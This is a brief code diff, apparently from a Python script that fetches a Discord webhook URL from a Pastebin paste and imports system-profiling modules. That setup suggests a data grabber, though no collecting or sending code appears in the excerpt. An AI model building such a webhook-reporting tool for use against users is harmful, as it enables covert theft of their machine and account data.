@@ -1,8 +1,8 @@
-import aiohttp, aiofiles, asyncio, os, re, platform, uuid, psutil, base64
+import aiohttp, asyncio, os, re, platform, uuid, psutil, base64
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
 # Only thing that needs editing is this
-PASTEBIN_URL = "https://pastebin.com/raw/8RinP9dM"
+PASTEBIN_URL = "https://pastebin.com/raw/PASTEBINID"
 
 # Grab the webhook url
 async def get_webhook_url(URL):
